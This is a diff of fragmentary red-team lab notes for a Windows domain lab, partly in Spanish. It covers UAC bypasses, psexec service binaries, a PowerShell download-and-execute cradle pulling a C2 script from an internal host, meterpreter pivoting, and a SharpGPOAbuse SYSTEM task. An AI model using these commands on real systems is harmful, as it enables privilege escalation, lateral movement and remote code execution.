@@ -43,10 +43,14 @@ C:\Program Files\CYBER\CYBER FW\FwSvc.exe
 
 Always Install Elevated
 
-UAC Bypasses
+UAC Bypasses                                                                                                  wusa.exe
 SharpShell /code:"var startInfo = new System.Diagnostics.ProcessStartInfo { FileName = @\"C:\Windows\System32\Taskmgr.exe\", WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden }; var taskmgr = new System.Diagnostics.Process { StartInfo = startInfo }; taskmgr.Start(); return taskmgr.Id.ToString();"
-(rasta) > BypassUACCommand cmd.exe "/c powershell -enc [...snip...]"
+(rasta) > BypassUACCommand cmd.exe "/c powershell -enc [...snip...]" o BypassUACGrunt /launcher:"powershell"
+BypassUACGrunt powershell ""crear antes un ps1 y dejarlo tal cual""
 
+crear un servicebinary sin moverlo
+psexec localhost servicebinary
+connect localhost pipen  or si httpgruntproxy no hace falta
 
 --Grunt Service Binary --
 --Connect localhost rastasvc--
@@ -215,7 +219,7 @@ meterpreter > portfwd add -R -p 8080 -l 80 -L 10.8.0.6
 portfwd add -R -p 9999 -l 443 -L 10.8.0.6
 remeber bind meterpreter
 route add 10.10.120.0/23 2
-(windows/smb/psexec) > set CMD powershell -Sta -Nop -Window Hidden -Command "iex (New-Object Net.WebClient).DownloadString('http://10.10.121.119:9999/http-grunt-pivot.ps1
+codif (windows/smb/psexec) > set CMD powershell -Sta -Nop -Window Hidden -Command "iex (New-Object Net.WebClient).DownloadString('http://10.10.121.119:9999/http-grunt-pivot.ps1
 
 #Data Protection API
 Credential Manager
@@ -350,7 +354,7 @@ Bloodhound
 PowerShell Get-DomainOU | Get-DomainObjectAcl -ResolveGUIDs | ? { $_.ObjectAceType -eq "GP-Link" -and $_.ActiveDirectoryRights -match "WriteProperty" } | select ObjectDN, SecurityIdentifier | fl
 PowerShell Find-DomainShare -CheckShareAccess
 PowerShell New-GPO -Name 'comemeloshuevos2' | New-GPLink -Target 'OU=3268,OU=Workstations,DC=cyberbotic,DC=io'  
-Assembly  /assemblyname:"SharpGPOAbuse" /parameters:"--AddComputerTask --TaskName \"Rasta Task\" --Author NT AUTHORITY\SYSTEM --Command \"cmd.exe\" --Arguments \"/c \\fs-1\software\nuevo5.exe\" --GPOName \"comemeloshuevos2\""
+Assembly  /assemblyname:"SharpGPOAbuse" /parameters:"--AddComputerTask --TaskName \"Rasta Task\" --Author NT AUTHORITY\SYSTEM --Command \"cmd.exe\" --Arguments \"/c \\fs-1\software\nuevo2.exe\" --GPOName \"comemeloshuevos2\""
 
 #MS SQL Servers
 MakeToken svc_mssql cyberbotic.io REDACTED
